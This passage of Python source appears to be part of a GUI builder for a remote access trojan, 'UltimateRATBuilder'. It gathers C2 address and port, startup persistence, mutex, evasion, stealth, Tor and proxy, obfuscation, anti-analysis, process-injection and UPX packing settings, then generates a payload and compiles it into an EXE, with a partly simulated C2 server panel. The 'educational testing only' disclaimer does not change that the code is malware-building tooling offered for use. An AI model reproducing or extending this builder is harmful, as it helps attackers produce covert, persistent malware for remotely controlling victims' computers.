            self.icon_file.insert(0, path)
    
    def generate_key(self):
        """Generate random encryption key"""
        key = Utils.generate_random_string(32)
        self.encryption_key.delete(0, tk.END)
        self.encryption_key.insert(0, key)
    
    def generate_icon(self):
        """Generate icon"""
        try:
            # Simple icon generation
            from PIL import Image, ImageDraw, ImageFont
            import numpy as np
            
            # Create image
            img = Image.new('RGBA', (256, 256), (0, 0, 0, 0))
            draw = ImageDraw.Draw(img)
            
            # Draw icon
            draw.ellipse([50, 50, 206, 206], fill='gray', outline='white', width=5)
            draw.ellipse([70, 70, 186, 186], fill='darkgray', outline='lightgray', width=3)
            
            # Save
            icon_path = os.path.join(tempfile.gettempdir(), "purat_icon.ico")
            img.save(icon_path, format='ICO')
            
            self.icon_file.delete(0, tk.END)
            self.icon_file.insert(0, icon_path)
            
            self.log_message(f"Icon generated: {icon_path}")
            
        except ImportError:
            self.log_message("Pillow required for icon generation")
    
    def update_config_from_ui(self):
        """Update configuration from UI"""
        try:
            # Basic settings
            self.config_manager.config.c2_ip = self.c2_ip.get()
            self.config_manager.config.c2_port = int(self.c2_port.get())
            self.config_manager.config.protocol = self.protocol.get()
            self.config_manager.config.install_name = self.install_name.get()
            self.config_manager.config.install_path = self.install_path.get()
            self.config_manager.config.startup_name = self.startup_name.get()
            self.config_manager.config.mutex_name = self.mutex_name.get()
            
            # Features
            for key, var in self.feature_vars.items():
                self.config_manager.config.features[key] = var.get()
            
            # Evasion
            for key, var in self.evasion_vars.items():
                self.config_manager.config.evasion[key] = var.get()
            
            # Stealth
            for key, var in self.stealth_vars.items():
                self.config_manager.config.stealth[key] = var.get()
            
            # Network
            self.config_manager.config.network["reconnect_interval"] = int(self.reconnect_interval.get())
            self.config_manager.config.network["timeout"] = int(self.timeout.get())
            self.config_manager.config.network["retry_count"] = int(self.retry_count.get())
            self.config_manager.config.network["use_https"] = self.use_https.get()
            self.config_manager.config.network["use_dns"] = self.use_dns.get()
            self.config_manager.config.network["use_tor"] = self.use_tor.get()
            self.config_manager.config.network["use_proxy"] = self.use_proxy.get()
            self.config_manager.config.network["proxy_host"] = self.proxy_host.get()
            self.config_manager.config.network["proxy_port"] = int(self.proxy_port.get() or 0)
            self.config_manager.config.network["user_agent"] = self.user_agent.get("1.0", tk.END).strip()
            
            # Advanced
            self.config_manager.config.advanced["encryption_key"] = self.encryption_key.get()
            self.config_manager.config.advanced["compression_level"] = int(self.compression_level.get())
            self.config_manager.config.advanced["obfuscation_level"] = int(self.obfuscation_level.get())
            self.config_manager.config.advanced["icon_file"] = self.icon_file.get()
            self.config_manager.config.advanced["architecture"] = self.architecture.get()
            self.config_manager.config.advanced["upx_pack"] = self.upx_pack.get()
            self.config_manager.config.advanced["anti_analysis"] = self.anti_analysis.get()
            
            # Payload
            self.config_manager.config.payload["type"] = self.payload_type.get()
            self.config_manager.config.payload["method"] = self.payload_method.get()
            self.config_manager.config.payload["injection_target"] = self.injection_target.get()
            self.config_manager.config.payload["junk_code"] = self.junk_code.get()
            
            return True
            
        except Exception as e:
            self.log_message(f"Error updating config: {e}")
            return False
    
    def update_ui_from_config(self):
        """Update UI from configuration"""
        try:
            # Basic settings
            self.c2_ip.delete(0, tk.END)
            self.c2_ip.insert(0, self.config_manager.config.c2_ip)
            
            self.c2_port.delete(0, tk.END)
            self.c2_port.insert(0, str(self.config_manager.config.c2_port))
            
            self.protocol.set(self.config_manager.config.protocol)
            self.install_name.delete(0, tk.END)
            self.install_name.insert(0, self.config_manager.config.install_name)
            self.install_path.delete(0, tk.END)
            self.install_path.insert(0, self.config_manager.config.install_path)
            self.startup_name.delete(0, tk.END)
            self.startup_name.insert(0, self.config_manager.config.startup_name)
            self.mutex_name.delete(0, tk.END)
            self.mutex_name.insert(0, self.config_manager.config.mutex_name)
            
            # Features
            for key, var in self.feature_vars.items():
                var.set(self.config_manager.config.features.get(key, False))
            
            # Evasion
            for key, var in self.evasion_vars.items():
                var.set(self.config_manager.config.evasion.get(key, False))
            
            # Stealth
            for key, var in self.stealth_vars.items():
                var.set(self.config_manager.config.stealth.get(key, False))
            
            # Network
            self.reconnect_interval.delete(0, tk.END)
            self.reconnect_interval.insert(0, str(self.config_manager.config.network["reconnect_interval"]))
            self.timeout.delete(0, tk.END)
            self.timeout.insert(0, str(self.config_manager.config.network["timeout"]))
            self.retry_count.delete(0, tk.END)
            self.retry_count.insert(0, str(self.config_manager.config.network["retry_count"]))
            self.use_https.set(self.config_manager.config.network["use_https"])
            self.use_dns.set(self.config_manager.config.network["use_dns"])
            self.use_tor.set(self.config_manager.config.network["use_tor"])
            self.use_proxy.set(self.config_manager.config.network["use_proxy"])
            self.proxy_host.delete(0, tk.END)
            self.proxy_host.insert(0, self.config_manager.config.network["proxy_host"])
            self.proxy_port.delete(0, tk.END)
            self.proxy_port.insert(0, str(self.config_manager.config.network["proxy_port"]))
            self.user_agent.delete("1.0", tk.END)
            self.user_agent.insert("1.0", self.config_manager.config.network["user_agent"])
            
            # Advanced
            self.encryption_key.delete(0, tk.END)
            self.encryption_key.insert(0, self.config_manager.config.advanced["encryption_key"])
            self.compression_level.set(self.config_manager.config.advanced["compression_level"])
            self.obfuscation_level.set(self.config_manager.config.advanced["obfuscation_level"])
            self.icon_file.delete(0, tk.END)
            self.icon_file.insert(0, self.config_manager.config.advanced["icon_file"])
            self.architecture.set(self.config_manager.config.advanced["architecture"])
            self.upx_pack.set(self.config_manager.config.advanced["upx_pack"])
            self.anti_analysis.set(self.config_manager.config.advanced["anti_analysis"])
            
            # Payload
            self.payload_type.set(self.config_manager.config.payload["type"])
            self.payload_method.set(self.config_manager.config.payload["method"])
            self.injection_target.delete(0, tk.END)
            self.injection_target.insert(0, self.config_manager.config.payload["injection_target"])
            self.junk_code.set(self.config_manager.config.payload["junk_code"])
            
        except Exception as e:
            self.log_message(f"Error updating UI: {e}")
    
    def new_config(self):
        """Create new configuration"""
        if messagebox.askyesno("New Configuration", "Reset all settings to default?"):
            self.config_manager.load_defaults()
            self.update_ui_from_config()
            self.log_message("Configuration reset to default")
    
    def load_config(self):
        """Load configuration from file"""
        filetypes = [("JSON files", "*.json"), ("All files", "*.*")]
        path = filedialog.askopenfilename(filetypes=filetypes)
        
        if path:
            if self.config_manager.load(path):
                self.update_ui_from_config()
                self.log_message(f"Configuration loaded from {path}")
            else:
                messagebox.showerror("Error", "Failed to load configuration")
    
    def save_config(self):
        """Save configuration to file"""
        self.update_config_from_ui()
        
        if self.config_manager.save():
            self.log_message("Configuration saved")
        else:
            messagebox.showerror("Error", "Failed to save configuration")
    
    def save_config_as(self):
        """Save configuration as new file"""
        self.update_config_from_ui()
        
        filetypes = [("JSON files", "*.json"), ("All files", "*.*")]
        path = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=filetypes,
            initialfile="purat_config.json"
        )
        
        if path:
            if self.config_manager.save(path):
                self.log_message(f"Configuration saved to {path}")
            else:
                messagebox.showerror("Error", "Failed to save configuration")
    
    def export_config(self):
        """Export configuration"""
        self.update_config_from_ui()
        
        format_type = simpledialog.askstring("Export Format", "Enter format (json/python/yaml):")
        if format_type:
            exported = self.config_manager.export(format_type)
            
            if exported:
                # Show in new window
                top = tk.Toplevel(self.root)
                top.title(f"Exported Configuration ({format_type})")
                top.geometry("600x400")
                
                text = scrolledtext.ScrolledText(top, wrap=tk.WORD)
                text.pack(fill="both", expand=True, padx=10, pady=10)
                text.insert("1.0", exported)
    
    def import_config(self):
        """Import configuration"""
        # Implementation similar to load_config
        pass
    
    def generate_payload(self):
        """Generate payload"""
        self.update_config_from_ui()
        
        try:
            self.log_message("Generating payload...")
            self.progress.start(10)
            
            # Create output directory
            output_dir = self.output_dir.get()
            if not Utils.create_directory(output_dir):
                raise Exception("Failed to create output directory")
            
            # Generate payload
            self.payload_generator = PayloadGenerator(self.config_manager.config)
            
            output_name = self.output_name.get()
            if not output_name:
                output_name = "payload"
            
            # Save Python payload
            py_file = os.path.join(output_dir, f"{output_name}.py")
            if self.payload_generator.save_to_file(py_file):
                self.log_message(f"Payload generated: {py_file}")
                
                # Show preview
                with open(py_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                self.build_log.delete("1.0", tk.END)
                self.build_log.insert("1.0", f"Payload generated successfully!\n\n")
                self.build_log.insert(tk.END, f"File: {py_file}\n")
                self.build_log.insert(tk.END, f"Size: {len(content)} bytes\n")
                self.build_log.insert(tk.END, f"Lines: {content.count(chr(10))}\n")
                
                # Switch to build tab
                self.notebook.select(self.tabs["Build"])
                
            else:
                raise Exception("Failed to generate payload")
            
        except Exception as e:
            self.log_message(f"Error generating payload: {e}")
            messagebox.showerror("Error", f"Failed to generate payload: {e}")
        
        finally:
            self.progress.stop()
    
    def build_exe(self):
        """Build EXE from payload"""
        if not self.payload_generator:
            messagebox.showwarning("Warning", "Generate payload first")
            return
        
        self.update_config_from_ui()
        
        if not messagebox.askyesno("Build EXE", "This will build an EXE file. Continue?"):
            return
        
        try:
            self.log_message("Building EXE...")
            self.progress.start(10)
            
            output_dir = self.output_dir.get()
            output_name = self.output_name.get()
            py_file = os.path.join(output_dir, f"{output_name}.py")
            exe_file = os.path.join(output_dir, f"{output_name}.exe")
            
            if not os.path.exists(py_file):
                raise Exception("Payload file not found")
            
            # Build EXE
            icon = self.icon_file.get() if self.icon_file.get() and os.path.exists(self.icon_file.get()) else None
            
            if self.payload_generator.build_exe(py_file, exe_file, icon):
                self.log_message(f"EXE built: {exe_file}")
                
                # Show file info
                if os.path.exists(exe_file):
                    size = os.path.getsize(exe_file)
                    self.build_log.insert(tk.END, f"\nEXE built successfully!\n")
                    self.build_log.insert(tk.END, f"File: {exe_file}\n")
                    self.build_log.insert(tk.END, f"Size: {size:,} bytes ({size/1024/1024:.2f} MB)\n")
                    
                    # Success animation
                    AnimationEngine.pulse_widget(self.build_log, self.theme_engine.colors["success"])
                    
                    messagebox.showinfo("Success", f"EXE built successfully!\n\nLocation: {exe_file}\nSize: {size:,} bytes")
                else:
                    self.log_message("EXE file not found after build")
            
            else:
                raise Exception("EXE build failed")
            
        except Exception as e:
            self.log_message(f"Error building EXE: {e}")
            messagebox.showerror("Error", f"Failed to build EXE: {e}")
        
        finally:
            self.progress.stop()
    
    def test_payload(self):
        """Test payload"""
        self.update_config_from_ui()
        
        if not messagebox.askyesno("Test Payload", "This will test the payload in safe mode. Continue?"):
            return
        
        try:
            output_dir = self.output_dir.get()
            output_name = self.output_name.get()
            py_file = os.path.join(output_dir, f"{output_name}.py")
            
            if not os.path.exists(py_file):
                raise Exception("Payload file not found")
            
            # Run in test mode
            env = os.environ.copy()
            env["PURAT_TEST_MODE"] = "1"
            
            self.log_message("Testing payload...")
            
            process = subprocess.Popen(
                [sys.executable, py_file],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                env=env,
                shell=True
            )
            
            # Wait and terminate
            time.sleep(3)
            process.terminate()
            
            try:
                process.wait(timeout=2)
            except subprocess.TimeoutExpired:
                process.kill()
            
            stdout, stderr = process.communicate()
            
            self.build_log.insert(tk.END, "\n=== Test Output ===\n")
            if stdout:
                self.build_log.insert(tk.END, f"STDOUT:\n{stdout}\n")
            if stderr:
                self.build_log.insert(tk.END, f"STDERR:\n{stderr}\n")
            
            self.log_message("Payload test completed")
            
        except Exception as e:
            self.log_message(f"Test error: {e}")
    
    def clean_build(self):
        """Clean build files"""
        output_dir = self.output_dir.get()
        
        if messagebox.askyesno("Clean Build", "Delete all build files?"):
            try:
                # Delete build artifacts
                for file in glob.glob(os.path.join(output_dir, "*.py")):
                    os.remove(file)
                
                for file in glob.glob(os.path.join(output_dir, "*.exe")):
                    os.remove(file)
                
                # Delete build directories
                build_dir = os.path.join(output_dir, "build")
                spec_dir = os.path.join(output_dir, "spec")
                
                if os.path.exists(build_dir):
                    shutil.rmtree(build_dir)
                
                if os.path.exists(spec_dir):
                    shutil.rmtree(spec_dir)
                
                self.log_message("Build cleaned")
                self.build_log.delete("1.0", tk.END)
                
            except Exception as e:
                self.log_message(f"Clean error: {e}")
    
    def start_c2_server(self):
        """Start C2 server"""
        # Implementation for C2 server
        self.log_message("C2 Server starting...")
        self.server_status.set("Server: STARTING")
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.restart_btn.config(state="normal")
        
        # Simulate server start
        self.root.after(1000, lambda: self.server_status.set("Server: RUNNING"))
        self.log_message("C2 Server started")
    
    def stop_c2_server(self):
        """Stop C2 server"""
        self.log_message("C2 Server stopping...")
        self.server_status.set("Server: STOPPING")
        
        # Simulate server stop
        self.root.after(1000, lambda: self.server_status.set("Server: STOPPED"))
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.restart_btn.config(state="disabled")
        self.log_message("C2 Server stopped")
    
    def restart_c2_server(self):
        """Restart C2 server"""
        self.stop_c2_server()
        self.root.after(2000, self.start_c2_server)
        self.log_message("C2 Server restarting...")
    
    def test_connection(self):
        """Test C2 connection"""
        self.update_config_from_ui()
        
        try:
            ip = self.config_manager.config.c2_ip
            port = self.config_manager.config.c2_port
            
            self.log_message(f"Testing connection to {ip}:{port}...")
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            try:
                result = sock.connect_ex((ip, port))
                if result == 0:
                    self.log_message("Connection successful!")
                    messagebox.showinfo("Success", f"Connected to {ip}:{port}")
                else:
                    self.log_message("Connection failed")
                    messagebox.showerror("Error", f"Failed to connect to {ip}:{port}")
            finally:
                sock.close()
                
        except Exception as e:
            self.log_message(f"Connection error: {e}")
            messagebox.showerror("Error", str(e))
    
    def test_obfuscation(self):
        """Test obfuscation"""
        try:
            test_code = '''
def hello_world():
    print("Hello World!")
    return "Test"
'''
            obf = Obfuscator()
            obfuscated = obf.obfuscate(test_code, level=3)
            
            # Show in dialog
            top = tk.Toplevel(self.root)
            top.title("Obfuscation Test")
            top.geometry("600x400")
            
            notebook = ttk.Notebook(top)
            notebook.pack(fill="both", expand=True, padx=5, pady=5)
            
            # Original
            orig_frame = ttk.Frame(notebook)
            notebook.add(orig_frame, text="Original")
            orig_text = scrolledtext.ScrolledText(orig_frame)
            orig_text.pack(fill="both", expand=True, padx=5, pady=5)
            orig_text.insert("1.0", test_code)
            
            # Obfuscated
            obf_frame = ttk.Frame(notebook)
            notebook.add(obf_frame, text="Obfuscated")
            obf_text = scrolledtext.ScrolledText(obf_frame)
            obf_text.pack(fill="both", expand=True, padx=5, pady=5)
            obf_text.insert("1.0", obfuscated)
            
            self.log_message("Obfuscation test completed")
            
        except Exception as e:
            self.log_message(f"Obfuscation test error: {e}")
    
    def encode_payload(self):
        """Encode payload"""
        self.log_message("Payload encoding not implemented yet")
    
    def edit_resources(self):
        """Edit resources"""
        self.log_message("Resource editor not implemented yet")
    
    def show_preferences(self):
        """Show preferences dialog"""
        # Implementation for preferences
        pass
    
    def show_compile_options(self):
        """Show compile options"""
        # Implementation for compile options
        pass
    
    def change_theme(self, theme_name):
        """Change theme"""
        if self.theme_engine.set_theme(theme_name):
            self.apply_theme()
            self.log_message(f"Theme changed to {theme_name}")
    
    def toggle_toolbar(self):
        """Toggle toolbar visibility"""
        if self.toolbar.winfo_ismapped():
            self.toolbar.grid_remove()
        else:
            self.toolbar.grid()
    
    def toggle_status_bar(self):
        """Toggle status bar visibility"""
        if self.status_bar.winfo_ismapped():
            self.status_bar.grid_remove()
        else:
            self.status_bar.grid()
    
    def toggle_fullscreen(self):
        """Toggle fullscreen"""
        self.root.attributes("-fullscreen", not self.root.attributes("-fullscreen"))
    
    def show_docs(self):
        """Show documentation"""
        docs = f"""{APP_NAME} - Documentation

Features:
‚Ä¢ Complete GUI Builder
‚Ä¢ .EXE Payload Generation
‚Ä¢ Multiple Evasion Techniques
‚Ä¢ Advanced Obfuscation
‚Ä¢ C2 Server Integration
‚Ä¢ Theme Support (Dark, Light, Cyberpunk, Matrix)

Usage:
1. Configure settings in tabs
2. Generate payload (.py)
3. Build EXE file
4. Test payload in safe mode
5. Start C2 server for control

Warning:
For educational purposes only.
Use only on systems you own."""
        
        top = tk.Toplevel(self.root)
        top.title("Documentation")
        top.geometry("500x400")
        
        text = scrolledtext.ScrolledText(top, wrap=tk.WORD)
        text.pack(fill="both", expand=True, padx=10, pady=10)
        text.insert("1.0", docs)
    
    def show_tutorial(self):
        """Show tutorial"""
        self.log_message("Tutorial not implemented yet")
    
    def check_updates(self):
        """Check for updates"""
        self.log_message("Update check not implemented")
    
    def show_about(self):
        """Show about dialog"""
        about = f"""{APP_NAME}
Version: {VERSION}
Professional Edition

Features:
‚Ä¢ Complete GUI with Themes
‚Ä¢ .EXE Payload Output Only
‚Ä¢ Advanced Obfuscation
‚Ä¢ Multiple Evasion Techniques
‚Ä¢ C2 Server Control
‚Ä¢ Professional Build System

For Educational Testing Only
¬© 2024 Security Research Team"""
        
        messagebox.showinfo(f"About {APP_NAME}", about)
    
    def undo(self):
        """Undo action"""
        self.log_message("Undo not implemented")
    
    def redo(self):
        """Redo action"""
        self.log_message("Redo not implemented")
    
    def copy(self):
        """Copy"""
        self.log_message("Copy not implemented")
    
    def paste(self):
        """Paste"""
        self.log_message("Paste not implemented")
    
    def clear_logs(self):
        """Clear logs"""
        self.log_text.delete("1.0", tk.END)
        self.log_message("Logs cleared")
    
    def save_logs(self):
        """Save logs to file"""
        filetypes = [("Text files", "*.txt"), ("All files", "*.*")]
        path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=filetypes,
            initialfile="purat_logs.txt"
        )
        
        if path:
            try:
                with open(path, 'w', encoding='utf-8') as f:
                    f.write(self.log_text.get("1.0", tk.END))
                self.log_message(f"Logs saved to {path}")
            except Exception as e:
                self.log_message(f"Save error: {e}")
    
    def copy_logs(self):
        """Copy logs to clipboard"""
        self.root.clipboard_clear()
        self.root.clipboard_append(self.log_text.get("1.0", tk.END))
        self.log_message("Logs copied to clipboard")
    
    def log_message(self, message: str):
        """Add message to log"""
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        
        # Add to log tab
        self.log_text.insert(tk.END, log_entry)
        self.log_text.see(tk.END)
        
        # Update status bar
        self.status_text.set(message[:100])
        
        # Also add to build log if it exists
        if hasattr(self, 'build_log'):
            self.build_log.insert(tk.END, log_entry)
            self.build_log.see(tk.END)
    
    def run(self):
        """Run the application"""
        try:
            self.root.mainloop()
        except Exception as e:
            print(f"Application error: {e}")

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main entry point"""
    print(f"""
    ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
    ‚ïë                    {APP_NAME}                    ‚ïë
    ‚ïë               Professional Edition - EXE Only            ‚ïë
    ‚ïë                  For Educational Testing Only            ‚ïë
    ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
    """)
    
    # Check Python version
    if sys.version_info < (3, 7):
        print("Python 3.7 or higher required")
        return
    
    # Check if GUI is available
    if not GUI_AVAILABLE:
        print("GUI libraries not available. Running in console mode.")
        run_console_mode()
        return
    
    # Run GUI application
    app = UltimateRATBuilder()
    app.run()

def run_console_mode():
    """Run in console mode"""
    print("\nConsole Mode")
    print("=" * 60)
    
    config_manager = ConfigManager()
    
    print("\nBasic Configuration:")
    config_manager.config.c2_ip = input(f"C2 IP [{config_manager.config.c2_ip}]: ") or config_manager.config.c2_ip
    config_manager.config.c2_port = int(input(f"C2 Port [{config_manager.config.c2_port}]: ") or config_manager.config.c2_port)
    
    print("\nGenerating payload...")
    
    generator = PayloadGenerator(config_manager.config)
    payload = generator.generate()
    
    output_name = input("\nOutput filename [payload.py]: ") or "payload.py"
    
    with open(output_name, 'w', encoding='utf-8') as f:
        f.write(payload)
    
    print(f"\n‚úì Payload generated: {output_name}")
    print(f"‚úì Size: {len(payload)} bytes")
    
    # Ask about building EXE
    if input("\nBuild EXE? (y/n): ").lower() == 'y':
        try:
            exe_name = output_name.replace('.py', '.exe')
            if generator.build_exe(output_name, exe_name):
                print(f"‚úì EXE built: {exe_name}")
                if os.path.exists(exe_name):
                    size = os.path.getsize(exe_name)
                    print(f"‚úì Size: {size:,} bytes ({size/1024/1024:.2f} MB)")
            else:
                print("‚úó EXE build failed")
        except Exception as e:
            print(f"‚úó Error: {e}")

if __name__ == "__main__":
    main()
